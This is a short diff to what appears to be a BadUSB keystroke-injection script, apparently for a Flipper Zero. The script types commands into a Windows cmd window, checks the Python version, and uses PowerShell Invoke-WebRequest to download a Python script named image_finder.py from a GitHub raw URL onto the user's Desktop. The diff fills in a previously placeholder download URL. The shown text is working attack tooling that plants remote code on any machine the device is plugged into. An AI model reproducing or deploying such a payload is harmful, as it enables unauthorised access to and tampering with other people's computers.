@@ -6,8 +6,13 @@ STRING cmd
 ENTER
 DELAY 1000
 
+REM Check Python version
+STRING python --version
+ENTER
+DELAY 1000
+
 REM Download the Python script using PowerShell
-STRING powershell -command "Invoke-WebRequest -Uri 'YOUR_SCRIPT_URL' -OutFile '%USERPROFILE%\Desktop\image_finder.py'"
+STRING powershell -command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/WilliamDuke02/Flipper_scripts/main/image_finder.py' -OutFile '%USERPROFILE%\Desktop\image_finder.py'"
 ENTER
 DELAY 3000
 
